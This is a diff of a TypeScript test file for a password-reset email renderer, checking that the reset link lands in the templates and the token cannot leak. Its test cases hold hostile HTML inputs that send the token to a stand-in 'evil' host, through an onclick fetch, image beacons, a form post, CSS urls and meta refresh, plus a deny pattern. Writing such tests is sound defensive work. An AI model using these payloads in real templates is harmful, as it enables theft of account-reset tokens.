@@ -237,48 +237,108 @@ describe('renderPasswordResetEmail', () => {
     expect(mail?.html).toContain('<a href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc">shared</a>');
   });
 
-  it('places the link into the seeded templates', async () => {
+  it('places the link into the seeded templates and keeps logo, band, button and footer', async () => {
     const dir = resolve(__dirname, '../../../../scripts/email-templates');
-    const source = (name: string) => readFileSync(resolve(dir, name), 'utf8');
+    const source = (name: string) => readFileSync(resolve(dir, name), 'utf8')
+      .replaceAll('%%HEADER_LINK%%', 'https://www.example.org')
+      .replaceAll('%%LOGO_URL%%', 'https://images.example.org/email-header.png')
+      .replaceAll('%%LOGO_ALT%%', 'Seeclub')
+      .replaceAll('%%LOGO_WIDTH%%', '209')
+      .replaceAll('%%FOOTER_NAME%%', 'Seeclub');
     const read = readerOf({
       'email-layout_scs': { doc: layoutDoc('scs'), version: { html: source('layout-standard.html'), text: source('layout-standard.txt') } },
       'email-text-password-reset': { doc: textDoc('system'), version: { html: source('text-password-reset.html'), text: source('text-password-reset.txt'), subject: source('text-password-reset.subject.txt') } },
     });
     const mail = await renderPasswordResetEmail('scs', { ...vars, login_id: 'anna' }, read);
-    expect(mail?.html).toContain('<a href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc" target="_blank"');
+    const html = mail?.html ?? '';
+    expect(html.startsWith('<!DOCTYPE html><html lang="de">')).toBe(true);
+    expect(html.match(/<html/g)).toHaveLength(1);
+    expect(html).toContain('<a href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc" target="_blank"');
+    expect(html).toContain('Passwort setzen');
+    expect(html).toContain('background:#2c6ee0');
+    expect(html).toContain('<a href="https://www.example.org" target="_blank">');
+    expect(html).toContain('<img src="https://images.example.org/email-header.png" alt="Seeclub" width="209"');
+    expect(html).toContain(`© ${new Date().getFullYear()} Seeclub`);
+    expect(html).toContain('<strong>anna</strong>');
+    expect(html).toContain('<p style="margin:0">Hallo,</p>');
+    expect(html).not.toMatch(/<style|<!--|<title/);
     expect(mail?.text).toContain(url);
-    expect(mail?.html).toContain('<strong>anna</strong>');
   });
 
   it('never hands the link to a template: a character lookup reads the token', async () => {
     const read = resetText({ subject: 's', html: '<a href="{{{url}}}">x</a><i>{{lookup url 0}}{{lookup url 1}}{{lookup url 2}}{{lookup url 3}}</i>', text: '{{{url}}} <{{url.[0]}}{{url.[1]}}{{url.[2]}}{{url.[3]}}>' });
     const mail = await renderPasswordResetEmail('scs', vars, read);
-    expect(mail?.html).toMatch(/<i>[0-9a-f-]{4}<\/i>/);
-    expect(mail?.text).toMatch(/<[0-9a-f-]{4}>/);
-    expect(mail?.html).not.toContain('<i>http');
-    expect(mail?.text).not.toContain('<http');
+    expect(mail?.html).toContain('<i>okr-</i>');
+    expect(mail?.text).toContain('<okr->');
   });
 
   it('leaves no token in the mail the recipient gets', async () => {
     const mail = await renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html: '<a href="{{{url}}}">x</a>', text: '{{{url}}}' }));
     expect(mail).toBeDefined();
-    expect(`${mail?.html}${mail?.text}`).not.toMatch(/[0-9a-f]{8}-[0-9a-f]{4}-/);
+    expect(`${mail?.html}${mail?.text}`).not.toContain('okr-reset-');
   });
 
+  const good = '<a href="{{{url}}}">Link</a>';
+
   it.each([
-    ['an image', '<img src="{{{url}}}"><a href="{{{url}}}">x</a>', '{{{url}}}', 's'],
-    ['a longer url', '<a href="https://evil/?l={{{url}}}">x</a>', '{{{url}}}', 's'],
-    ['the subject', '<a href="{{{url}}}">x</a>', '{{{url}}}', 'Link {{{url}}}'],
-    ['the text half missing it', '<a href="{{{url}}}">x</a>', 'no link', 's'],
-    ['visible text', '<a href="{{{url}}}">x</a> {{url}}', '{{{url}}}', 's'],
-  ])('falls to the next source with the token in %s', async (_, html, text, subject) => {
-    await expect(renderPasswordResetEmail('scs', vars, resetText({ subject, html, text }))).resolves.toBeUndefined();
+    ['an image', '<img src="{{{url}}}">'],
+    ['an image next to the link', `<img src="{{{url}}}">${good}`],
+    ['a longer url', '<a href="https://evil/?l={{{url}}}">x</a>'],
+    ['a longer url next to the link', `<a href="https://evil/?l={{{url}}}">x</a>${good}`],
+    ['a dropped attribute only', '<a data-x="{{{url}}}" href="https://a.ch">x</a>'],
+    ['a kept attribute next to the link', `<a title="{{{url}}}" href="https://a.ch">x</a>${good}`],
+    ['a style attribute next to the link', `<p style="background:url(https://evil/{{{url}}})">x</p>${good}`],
+    ['a style block only', '<style>a { background: url(https://evil/{{{url}}}); }</style>'],
+    ['a comment only', '<!-- {{{url}}} -->'],
+    ['visible text', `${good}<p>{{{url}}}</p>`],
+    ['visible text, escaped braces', `${good} {{url}}`],
+    ['no token at all', '<p>no link</p>'],
+    ['an unterminated image before the link', `<img src="https://evil/?${good}`],
+    ['a conditional comment around the link', `<!--[if mso]>${good}<![endif]-->`],
+    ['a noscript around the link', `<noscript>${good}</noscript>`],
+    ['a textarea only', '<form action="https://evil/"><textarea>{{{url}}}</textarea></form>'],
+  ])('refuses the token in %s', async (_, html) => {
+    await expect(renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html, text: '{{{url}}}' }))).resolves.toBeUndefined();
     expect(logger.error).toHaveBeenCalledTimes(1);
     expect(reportToSentry).toHaveBeenCalledTimes(1);
   });
 
+  it.each([
+    ['the subject', '<a href="{{{url}}}">x</a>', '{{{url}}}', 'Link {{{url}}}'],
+    ['a text half without it', '<a href="{{{url}}}">x</a>', 'no link', 's'],
+    ['a longer url in the text half', '<a href="{{{url}}}">x</a>', 'https://evil/?l={{{url}}}', 's'],
+  ])('refuses %s', async (_, html, text, subject) => {
+    await expect(renderPasswordResetEmail('scs', vars, resetText({ subject, html, text }))).resolves.toBeUndefined();
+  });
+
+  it.each([
+    ['CDATA', `<![CDATA[${good}]]>${good}`],
+    ['a conditional comment', `<!--[if mso]><a href="https://evil/">x</a><![endif]-->${good}`],
+    ['a comment closed with --!>', `<!-- x --!>${good}<!-- y -->${good}`],
+    ['a comment holding the token', `<!-- {{{url}}} -->${good}`],
+    ['noscript', `<noscript><img src="https://evil/?{{{url}}}"></noscript>${good}`],
+    ['svg', `<svg><image href="https://evil/x.png" /><a href="{{{url}}}">x</a></svg>${good}`],
+    ['math', `<math><a href="{{{url}}}">x</a></math>${good}`],
+    ['onclick', `<a href="{{{url}}}" onclick="fetch('https://evil/?'+this.href)">x</a>`],
+    ['onmouseover on a parent', `<div onmouseover="location='https://evil/'">${good}</div>`],
+    ['ping', '<a href="{{{url}}}" ping="https://evil/">x</a>'],
+    ['a style block reading the href', `<style>a[href^="https://a"] { background: url(https://evil/a); }</style>${good}`],
+    ['base', `<base href="https://evil/">${good}`],
+    ['a form with a textarea', `<form action="https://evil/"><textarea>{{{url}}}</textarea>${good}</form>`],
+    ['a meta refresh', `<meta http-equiv="refresh" content="0;url=https://evil/">${good}`],
+    ['a link stylesheet', `<link rel="stylesheet" href="https://evil/x.css">${good}`],
+  ])('leaves nothing harmful beside the link: %s', async (_, html) => {
+    const mail = await renderPasswordResetEmail('scs', vars, resetText({ subject: 's', html, text: '{{{url}}}' }));
+    if (!mail) return;
+    expect(mail.html).not.toMatch(/evil|\son\w+=|ping=|<style|<base|<form|<textarea|<svg|<math|<noscript|<meta http-equiv|<link/);
+    const hrefs = mail.html.split('href="https://app.example.org/auth/confirm?mode=resetPassword&amp;oobCode=abc"').length - 1;
+    expect(hrefs).toBeGreaterThan(0);
+    expect(mail.html.split('oobCode').length - 1).toBe(hrefs);
+    expect(mail.html).not.toContain('okr-reset-');
+  });
+
   it('falls to the next source when a layout copies the content into an attribute', async () => {
-    const layout = { html: '<div title="{{content}}">{{{content}}}</div>', text: '{{{content}}}' };
+    const layout = { html: '<a title="{{content}}" href="https://a.ch">x</a>{{{content}}}', text: '{{{content}}}' };
     const read = readerOf({ ...base, 'email-layout_scs': { doc: layoutDoc('scs'), version: layout } });
     await expect(renderPasswordResetEmail('scs', vars, read)).resolves.toBeUndefined();
   });
